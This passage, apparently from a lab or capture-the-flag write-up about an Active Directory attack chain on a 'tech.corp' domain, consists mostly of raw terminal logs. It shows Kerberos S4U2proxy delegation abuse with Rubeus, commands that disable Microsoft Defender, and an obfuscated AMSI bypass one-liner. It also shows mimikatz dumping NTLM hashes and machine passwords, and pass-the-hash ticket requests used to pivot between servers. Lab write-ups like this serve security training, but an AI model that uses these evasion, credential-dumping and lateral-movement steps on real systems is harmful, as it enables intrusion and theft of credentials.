      qHDE/RGJYBEyQcqL/qHDvfDWJaTaf77Bu8fNI2G+hG/uGQ1ape4yhow7uEGZuNml9fhdShhaYfeNELwv
      Mv71XNtuSDPhJaTCTSukSk3fChk7EEO81QuscM0Y6EaQeSjSSWdExP8fhEvfCNUI8MUKZz9uVAsFqe/x
      bdI59z95U5LU1X7PmOjldG75AJ0ZHk/Uj5K+dtSDdJXxI72/ux8FyVruUMMz/UjV0uUoBnA/VF3zR7TA
      nMEU453TkEgNF78S6j290j+DAlpjaVHAmlddtrpmDHp6saV2ka/W1ahKltBd5HDfAxV0kGQTbDF6xYt2
      Ei4oPtBviwWVsvwd0R5KT+ufoiNmbGDu6XWMsgxPsjudmDX0PynwNIoIKJi1PbzAv2UxMHRDXg1y3FPu
      SJu6h98nI7P5s1Jcis4b6mj1ZZWF0SEkS5SbUNmSWs9pCjPgsNwaYdaLj9Cor/k3a7/nES+ecfkcgMtw
      q5BQnmxvgo7EtorIat7yfFBuyIC/ZFnJjN/CUoeUWo0Qvr/DEyYT9pPMm188XPW0dXlZmT1e+kt3s57B
      P8T0U4kH1a7Gx2elatTnTFWjJBEK/o2mYH7ZS+059VxVC2FZa57nIqytH9zcwTGX6QFj3457cJyc6/Ua
      DQs6Nox2PCuCneC1bR+O4jhLk72gAjF7TwszkEsm8ALnQHHNE2gArtSveRJbv6JvVSklFLihgR5RB7W4
      m69Hny3LSHBS/m61JUZj2IhkQzn9jK9tRrw0LP5DCG5QnwRE059GjsJdvga9IbzBScG18u4wdFo9X1N4
      4mSRjCgkAzduzoBA6I4edyzJ0GfkH8kRrqGQF9qPjxo1/6XYSJNT+3hj7HWEel4CmQxlBQSm8NTdOxBP
      g3VLt1kNydlLlYvmgATLneMlkRJvIXV/gs2GKBVAbun384wlD/jDy3RJcqOB1DCB0aADAgEAooHJBIHG
      fYHDMIHAoIG9MIG6MIG3oCswKaADAgESoSIEIG0NXmwQ2Bst8hM7qG/FPo5rnDHf5VMv6cI7uDCK2riG
      oQsbCVRFQ0guQ09SUKIWMBSgAwIBCqENMAsbCXRlY2hhZG1pbqMHAwUAQKEAAKURGA8yMDI1MTIwOTA3
      NTAwOFqmERgPMjAyNTEyMDkxNzUwMDdapxEYDzIwMjUxMjE2MDc1MDA3WqgLGwlURUNILkNPUlCpFDAS
      oAMCAQGhCzAJGwdzdHVkdm0k

[*] Impersonating user 'techadmin' to target SPN 'WSMAN/mgmtsrv.tech.corp'
[*]   Final ticket will be for the alternate service 'http'
[*] Building S4U2proxy request for service: 'WSMAN/mgmtsrv.tech.corp'
[*] Using domain controller: tech-dc.tech.corp (172.16.4.5)
[*] Sending S4U2proxy request to domain controller 172.16.4.5:88
[+] S4U2proxy success!
[*] Substituting alternative service name 'http'
[*] base64(ticket.kirbi) for SPN 'http/mgmtsrv.tech.corp':

      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
      dHNydi50ZWNoLmNvcnA=
[+] Ticket successfully imported!
PS C:\Users\studentuser\Desktop> Enter-PSSession -ComputerName mgmtsrv.tech.corp
[mgmtsrv.tech.corp]: PS C:\Users\techadmin\Documents> whoami
tech\techadmin
[mgmtsrv.tech.corp]: PS C:\Users\techadmin\Documents>
```

{{< figure src="image 2.png" alt="image 2" >}}

### TechSRV30

{{< figure src="image 3.png" alt="image 3" >}}

```xml
PS C:\Users\studentuser\Desktop> Copy-Item -Path "C:\Users\studentuser\Desktop\mimikatz.exe" -Destination "C:\Temp\" -ToSession $session
PS C:\Users\studentuser\Desktop> Copy-Item -Path "C:\Users\studentuser\Desktop\Rubeus.exe" -Destination "C:\Temp\" -ToSession $session
PS C:\Users\studentuser\Desktop> Copy-Item -Path "C:\Users\studentuser\Desktop\PowerView.ps1" -Destination "C:\Temp\" -ToSession $session          PS C:\Users\studentuser\Desktop> Copy-Item -Path "C:\Users\studentuser\Desktop\Certify.exe" -Destination "C:\Temp\" -ToSession $session            PS C:\Users\studentuser\Desktop> Enter-PSSession $session
[mgmtsrv.tech.corp]: PS C:\Users\techadmin\Documents> New-Item -ItemType Directory -Path C:\Temp -Force

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         12/9/2025   8:08 AM                Temp

[mgmtsrv.tech.corp]: PS C:\Users\techadmin\Documents> Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true
[mgmtsrv.tech.corp]: PS C:\Users\techadmin\Documents> S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
[mgmtsrv.tech.corp]: PS C:\Users\techadmin\Documents> cd C:\Temp
[mgmtsrv.tech.corp]: PS C:\Temp> ls

    Directory: C:\Temp

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         12/9/2025   7:13 AM         174080 Certify.exe
-a----         10/2/2025  12:16 PM        1355264 mimikatz.exe
-a----         10/2/2025  12:10 PM         770279 PowerView.ps1
-a----         12/9/2025   7:17 AM         498688 Rubeus.exe

[mgmtsrv.tech.corp]: PS C:\Temp> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

.#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( [benjamin@gentilkiwi.com](mailto:benjamin@gentilkiwi.com) )
## \ / ##       > [https://blog.gentilkiwi.com/mimikatz](https://blog.gentilkiwi.com/mimikatz)
'## v ##'       Vincent LE TOUX             ( [vincent.letoux@gmail.com](mailto:vincent.letoux@gmail.com) )
'#####'        > [https://pingcastle.com](https://pingcastle.com/) / [https://mysmartlogon.com](https://mysmartlogon.com/) ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 696335 (00000000:000aa00f)
Session           : Service from 0
User Name         : techservice
Domain            : TECH
Logon Server      : tech-dc
Logon Time        : 12/9/2025 6:37:14 AM
SID               : S-1-5-21-1600556212-896947471-994435180-1108
msv :
[00000003] Primary
* Username : techservice
* Domain   : TECH
* NTLM     : f8bc230ee35a2e0acf1632b4091e10cd
* SHA1     : 340c38f004ca0ffd248303deecb0c6b3e43294e2
* DPAPI    : 285567d50c22079ea76a8fad27d2bac5
tspkg :
wdigest :
* Username : techservice
* Domain   : TECH
* Password : (null)
kerberos :
* Username : techservice
* Domain   : TECH.CORP
* Password : (null)
ssp :
credman :
cloudap :

Authentication Id : 0 ; 64627 (00000000:0000fc73)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:20 AM
SID               : S-1-5-90-0-1
msv :
[00000003] Primary
* Username : mgmtsrv$
* Domain   : TECH
* NTLM     : 5652a7f10cdaa24290e31a4314d93c32
* SHA1     : 952e84b79f9e7d1e19737e19d2b37226f8a64a1f
* DPAPI    : 952e84b79f9e7d1e19737e19d2b37226
tspkg :
wdigest :
* Username : mgmtsrv$
* Domain   : TECH
* Password : (null)
kerberos :
* Username : mgmtsrv$
* Domain   : tech.corp
* Password : KbwsrA$T)\SUCUwbSRaal4>aFcpiLnR`WyxrWn&U.i/Oqj%Dl>`xa^IP&'Jtfr0/&[g-Vu`YEz^=.!L`Abq'z LgouWVsZ;]Q,4HuA$,9LDB;9av6=hyXNBv
ssp :
credman :
cloudap :

Authentication Id : 0 ; 64605 (00000000:0000fc5d)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:20 AM
SID               : S-1-5-90-0-1
msv :
[00000003] Primary
* Username : mgmtsrv$
* Domain   : TECH
* NTLM     : 6eb796fbae2c8daa225c314903d32e16
* SHA1     : 9aee066b5a36a77b9677ada82daa4bc23bf70af5
* DPAPI    : 9aee066b5a36a77b9677ada82daa4bc2
tspkg :
wdigest :
* Username : mgmtsrv$
* Domain   : TECH
* Password : (null)
kerberos :
* Username : mgmtsrv$
* Domain   : tech.corp
* Password : 2a 58 9d 4c cf 3d 2b 1e 2d 32 7e 76 ff 2f 5b 29 0d dc c5 5d 94 3d 49 e0 fc 2d 2a 60 9f 60 5e ac a0 78 f4 7f 17 ce 6f 1c 84 7b a9 a7 53 0f a3 68 f8 e0 8a 44 e1 d7 74 52 3f 23 98 94 43 e6 57 e8 69 07 ef ca 7e e4 05 20 5d 2d f6 04 5f e4 cc 32 f4 14 04 0d 0f dc 96 ea a5 88 51 53 91 db 02 e6 02 52 ca 0c 50 8b c6 ed c6 58 6e 6d c4 e0 46 28 95 1c fa 49 fd 0b a2 be 70 28 80 87 22 2f e3 8e 44 ea 68 b4 a1 35 e4 eb 45 8e aa 1d b2 ac 5f f0 d9 90 cf e2 4e 8a 31 b8 8b 79 79 29 a4 43 9d 03 58 3a f4 42 dd 7e 5e 4a 68 cc a6 40 45 d7 cf d0 a0 5e 04 67 e7 d8 c0 dd fe b5 1e 18 09 82 3d 69 7b 76 ca 52 e2 d6 dd 1e 90 b5 de c2 34 f3 d7 4c c9 58 f7 12 cf 3e 2c 6c 6d 42 d3 36 b5 e2 3d 7d 98 02 7e 04 e5 09 68 af c3 c6 c0 db 62 97 da 05
ssp :
credman :
cloudap :

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : mgmtsrv$
Domain            : TECH
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:19 AM
SID               : S-1-5-20
msv :
[00000003] Primary
* Username : mgmtsrv$
* Domain   : TECH
* NTLM     : 6eb796fbae2c8daa225c314903d32e16
* SHA1     : 9aee066b5a36a77b9677ada82daa4bc23bf70af5
* DPAPI    : 9aee066b5a36a77b9677ada82daa4bc2
tspkg :
wdigest :
* Username : mgmtsrv$
* Domain   : TECH
* Password : (null)
kerberos :
* Username : mgmtsrv$
* Domain   : TECH.CORP
* Password : 2a 58 9d 4c cf 3d 2b 1e 2d 32 7e 76 ff 2f 5b 29 0d dc c5 5d 94 3d 49 e0 fc 2d 2a 60 9f 60 5e ac a0 78 f4 7f 17 ce 6f 1c 84 7b a9 a7 53 0f a3 68 f8 e0 8a 44 e1 d7 74 52 3f 23 98 94 43 e6 57 e8 69 07 ef ca 7e e4 05 20 5d 2d f6 04 5f e4 cc 32 f4 14 04 0d 0f dc 96 ea a5 88 51 53 91 db 02 e6 02 52 ca 0c 50 8b c6 ed c6 58 6e 6d c4 e0 46 28 95 1c fa 49 fd 0b a2 be 70 28 80 87 22 2f e3 8e 44 ea 68 b4 a1 35 e4 eb 45 8e aa 1d b2 ac 5f f0 d9 90 cf e2 4e 8a 31 b8 8b 79 79 29 a4 43 9d 03 58 3a f4 42 dd 7e 5e 4a 68 cc a6 40 45 d7 cf d0 a0 5e 04 67 e7 d8 c0 dd fe b5 1e 18 09 82 3d 69 7b 76 ca 52 e2 d6 dd 1e 90 b5 de c2 34 f3 d7 4c c9 58 f7 12 cf 3e 2c 6c 6d 42 d3 36 b5 e2 3d 7d 98 02 7e 04 e5 09 68 af c3 c6 c0 db 62 97 da 05
ssp :
credman :
cloudap :

Authentication Id : 0 ; 28942 (00000000:0000710e)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:19 AM
SID               : S-1-5-96-0-0
msv :
[00000003] Primary
* Username : mgmtsrv$
* Domain   : TECH
* NTLM     : 6eb796fbae2c8daa225c314903d32e16
* SHA1     : 9aee066b5a36a77b9677ada82daa4bc23bf70af5
* DPAPI    : 9aee066b5a36a77b9677ada82daa4bc2
tspkg :
wdigest :
* Username : mgmtsrv$
* Domain   : TECH
* Password : (null)
kerberos :
* Username : mgmtsrv$
* Domain   : tech.corp
* Password : 2a 58 9d 4c cf 3d 2b 1e 2d 32 7e 76 ff 2f 5b 29 0d dc c5 5d 94 3d 49 e0 fc 2d 2a 60 9f 60 5e ac a0 78 f4 7f 17 ce 6f 1c 84 7b a9 a7 53 0f a3 68 f8 e0 8a 44 e1 d7 74 52 3f 23 98 94 43 e6 57 e8 69 07 ef ca 7e e4 05 20 5d 2d f6 04 5f e4 cc 32 f4 14 04 0d 0f dc 96 ea a5 88 51 53 91 db 02 e6 02 52 ca 0c 50 8b c6 ed c6 58 6e 6d c4 e0 46 28 95 1c fa 49 fd 0b a2 be 70 28 80 87 22 2f e3 8e 44 ea 68 b4 a1 35 e4 eb 45 8e aa 1d b2 ac 5f f0 d9 90 cf e2 4e 8a 31 b8 8b 79 79 29 a4 43 9d 03 58 3a f4 42 dd 7e 5e 4a 68 cc a6 40 45 d7 cf d0 a0 5e 04 67 e7 d8 c0 dd fe b5 1e 18 09 82 3d 69 7b 76 ca 52 e2 d6 dd 1e 90 b5 de c2 34 f3 d7 4c c9 58 f7 12 cf 3e 2c 6c 6d 42 d3 36 b5 e2 3d 7d 98 02 7e 04 e5 09 68 af c3 c6 c0 db 62 97 da 05
ssp :
credman :
cloudap :

Authentication Id : 0 ; 27673 (00000000:00006c19)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:19 AM
SID               :
msv :
[00000003] Primary
* Username : mgmtsrv$
* Domain   : TECH
* NTLM     : 6eb796fbae2c8daa225c314903d32e16
* SHA1     : 9aee066b5a36a77b9677ada82daa4bc23bf70af5
* DPAPI    : 9aee066b5a36a77b9677ada82daa4bc2
tspkg :
wdigest :
kerberos :
ssp :
credman :
cloudap :

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:20 AM
SID               : S-1-5-19
msv :
tspkg :
wdigest :
* Username : (null)
* Domain   : (null)
* Password : (null)
kerberos :
* Username : (null)
* Domain   : (null)
* Password : (null)
ssp :
credman :
cloudap :

Authentication Id : 0 ; 28908 (00000000:000070ec)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:19 AM
SID               : S-1-5-96-0-1
msv :
[00000003] Primary
* Username : mgmtsrv$
* Domain   : TECH
* NTLM     : 6eb796fbae2c8daa225c314903d32e16
* SHA1     : 9aee066b5a36a77b9677ada82daa4bc23bf70af5
* DPAPI    : 9aee066b5a36a77b9677ada82daa4bc2
tspkg :
wdigest :
* Username : mgmtsrv$
* Domain   : TECH
* Password : (null)
kerberos :
* Username : mgmtsrv$
* Domain   : tech.corp
* Password : 2a 58 9d 4c cf 3d 2b 1e 2d 32 7e 76 ff 2f 5b 29 0d dc c5 5d 94 3d 49 e0 fc 2d 2a 60 9f 60 5e ac a0 78 f4 7f 17 ce 6f 1c 84 7b a9 a7 53 0f a3 68 f8 e0 8a 44 e1 d7 74 52 3f 23 98 94 43 e6 57 e8 69 07 ef ca 7e e4 05 20 5d 2d f6 04 5f e4 cc 32 f4 14 04 0d 0f dc 96 ea a5 88 51 53 91 db 02 e6 02 52 ca 0c 50 8b c6 ed c6 58 6e 6d c4 e0 46 28 95 1c fa 49 fd 0b a2 be 70 28 80 87 22 2f e3 8e 44 ea 68 b4 a1 35 e4 eb 45 8e aa 1d b2 ac 5f f0 d9 90 cf e2 4e 8a 31 b8 8b 79 79 29 a4 43 9d 03 58 3a f4 42 dd 7e 5e 4a 68 cc a6 40 45 d7 cf d0 a0 5e 04 67 e7 d8 c0 dd fe b5 1e 18 09 82 3d 69 7b 76 ca 52 e2 d6 dd 1e 90 b5 de c2 34 f3 d7 4c c9 58 f7 12 cf 3e 2c 6c 6d 42 d3 36 b5 e2 3d 7d 98 02 7e 04 e5 09 68 af c3 c6 c0 db 62 97 da 05
ssp :
credman :
cloudap :

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : mgmtsrv$
Domain            : TECH
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:19 AM
SID               : S-1-5-18
msv :
tspkg :
wdigest :
* Username : mgmtsrv$
* Domain   : TECH
* Password : (null)
kerberos :
* Username : mgmtsrv$
* Domain   : TECH.CORP
* Password : (null)
ssp :
credman :
cloudap :

mimikatz(commandline) # exit
Bye!
[mgmtsrv.tech.corp]: PS C:\Temp>
```

Pivot to `TECHSRV30`

```xml
PS C:\Users\studentuser\Desktop> ./Rubeus.exe asktgt /user:techservice /rc4:f8bc230ee35a2e0acf1632b4091e10cd /domain:tech.corp /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using rc4_hmac hash: f8bc230ee35a2e0acf1632b4091e10cd
[*] Building AS-REQ (w/ preauth) for: 'tech.corp\techservice'
[*] Using domain controller: 172.16.4.5:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/tech.corp
  ServiceRealm             :  TECH.CORP
  UserName                 :  techservice (NT_PRINCIPAL)
  UserRealm                :  TECH.CORP
  StartTime                :  12/9/2025 8:50:54 AM
  EndTime                  :  12/9/2025 6:50:54 PM
  RenewTill                :  12/16/2025 8:50:54 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  GBaBqpLzMnevG5BTfPXrFg==
  ASREP (key)              :  F8BC230EE35A2E0ACF1632B4091E10CD
```

{{< figure src="image 4.png" alt="image 4" >}}

### AdminSRV86

```xml
[techsrv30.tech.corp]: PS C:\Users\puretech\Documents> Set-MpPreference -DisableRealtimeMonitoring $true
[techsrv30.tech.corp]: PS C:\Users\puretech\Documents> Set-MpPreference -DisableScriptScanning $true
[techsrv30.tech.corp]: PS C:\Users\puretech\Documents> Get-MpPreference | Select-Object DisableRealtimeMonitoring,DisableScriptScanning

DisableRealtimeMonitoring DisableScriptScanning
------------------------- ---------------------
                     True                  True

[techsrv30.tech.corp]: PS C:\Users\puretech\Documents> exit
PS C:\Users\studentuser\Desktop> Copy-Item -Path "C:\Users\studentuser\Desktop\mimikatz.exe" -Destination "C:\Users\puretech\Documents\" -ToSession (New-PSSession -ComputerName techsrv30.tech.corp -Credential $cred)
PS C:\Users\studentuser\Desktop> Enter-PSSession -ComputerName techsrv30.tech.corp -Credential $cred
[techsrv30.tech.corp]: PS C:\Users\puretech\Documents> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" | Out-File -FilePath creds.txt
[techsrv30.tech.corp]: PS C:\Users\puretech\Documents> cat .\creds.txt

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # sekurlsa::logonpasswords

Authentication Id : 0 ; 64753 (00000000:0000fcf1)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 12/9/2025 6:29:16 AM
SID               : S-1-5-90-0-1
        msv :
         [00000003] Primary
         * Username : techsrv30$
         * Domain   : TECH
         * NTLM     : 75a667d1b05db757150410f320e0ff55
         * SHA1     : a43906378e16c8529493ca8856e15373980605a8
         * DPAPI    : a43906378e16c8529493ca8856e15373
        tspkg :
        wdigest :
         * Username : techsrv30$
         * Domain   : TECH
         * Password : (null)
        kerberos :
         * Username : techsrv30$
         * Domain   : tech.corp
         * Password : c9 34 92 3f 54 dc dd 7e 15 59 ae d1 d9 43 95 3c 07 7f 3a b0 47 c6 45 ac 07 49 72 d7 0c 1f f6 1d 64 57 49 3a 42 87 e4 8f e7 2a ff 95 66 cd a4 b6 a3 ef 1c f9 9c 2b 7b 3f 45 07 7c d0 0e c1 4f 22 e0 99 43 4d 35 12 06 e0 8f 54 1f 36 2d 22 a5 47 ed 0c bc 23 15 66 bc 61 93 e5 a4 bc 36 0c 3d ed cf 32 c8 78 c7 54 29 e1 9d f5 90 37 81 9f 44 3c c4 7e 23 f4 4a 69 54 60 ec 4b ae 61 a7 dd 4f 13 9f 03 39 71 47 67 1e ed 49 e0 9a ba 21 e4 c3 94 fe 35 ee b2 e6 e9 9c cc a2 6e 50 37 93 7f 68 db 79 09 84 b4 ac 6d 02 91 0a 84 47 4c d5 b5 61 f6 51 8c fc 77 51 9d c4 86 b3 4c 01 03 32 30 59 6d 2b a8 7d a8 3b 15 d2 b2 1d d5 fb 98 68 00 d9 99 23 51 1d 1c 6e c9 57 e0 9d 01 ba 36 96 af 7f c8 80 da 99 4e 29 5e 9f 70 fe 00 e5 0c 66 22 d8 10
